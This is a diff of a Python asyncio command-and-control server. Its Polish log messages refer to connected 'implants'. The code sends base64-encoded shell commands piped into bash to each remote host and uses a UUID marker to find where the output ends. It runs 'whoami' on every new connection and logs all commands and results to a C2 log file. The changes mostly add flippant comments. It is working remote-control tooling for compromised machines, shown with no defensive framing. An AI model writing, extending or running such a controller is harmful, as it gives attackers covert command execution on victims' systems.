@@ -8,46 +8,50 @@ import base64
 sesje = {}
 
 async def run_cmd(reader, writer, command, host, user):
-    granica = str(uuid4())
+    granica = str(uuid4())                                #creating border
     while not reader.at_eof():
-        if reader._buffer:
+        if reader._buffer:                                 #clearing buffer bc y not
          reader._buffer.clear()
         else:
             break
+
     command = "( "+ command.strip()
     command2 = f" && echo -n {granica})"
-    command = base64.standard_b64encode(((command+command2).encode()))
+    command = base64.standard_b64encode(((command+command2).encode()))               #crafting paylaod - magic - don't touch
     full = "base64 -d <<< ".encode() + command + " | bash\n".encode()
-
     print (f"full to {full.decode()}")
+
     writer.write(full)
-    await writer.drain()
-    await sleep(0.1)
+    await writer.drain()                                         #send and be sure that command was sent
+    await sleep(0.05)
 
     odp = b""
     while granica.encode() not in odp:
         try: 
             chunk = await wait_for(reader.read(4096),timeout=5)
             if not chunk:
-                raise ConnectionError(f"[-]problem z połączeniem z implantem {user}@{host}")
+                raise ConnectionError(f"[-]problem z połączeniem z implantem {user}@{host}")          #parsing that monstrosity
             odp+=chunk
-        except TimeoutError:
+        
+        except TimeoutError:                                                            #main feature
             raise ConnectionError(f"[-]timeout of {user}@{host} ended")
-    output = odp.rsplit(granica.encode(),1)[0]
+        
+    output = odp.rsplit(granica.encode(),1)[0]                                          #parsing actual output from border
     async with open (f'c2_conf/main.log',mode='a') as log:
-        await log.write(f"\n[{datetime.datetime.now()}] command {command} executed as {user}@{host} with output:\n {str(output.strip().decode())}")
+        await log.write(f"\n[{datetime.datetime.now()}] command {command} executed as {user}@{host} with output:\n {str(output.strip().decode())}")         #add log 4fun
     return output.strip()
 
 
 
 async def handler(reader,writer):
-    addr = writer.get_extra_info('peername')
-    print(f"[N] znaleziono połączenie z {addr}")
+    addr = writer.get_extra_info('peername')                    
+    print(f"[N] znaleziono połączenie z {addr}")                         #init
     sesje[addr] = writer
-    try:    
-        username = "{C2_unknown}"
-        try:
-            await wait_for(reader.read(4096), timeout=0.3)
+
+    try:                                                #first try statement
+        username = "{C2_unknown}"                                      
+        try:                                              #second try statement to assert real alpha male's dominance
+            await wait_for(reader.read(4096), timeout=0.3)  
         except TimeoutError:
             pass
         output = await run_cmd(reader,writer,"whoami", addr, username)
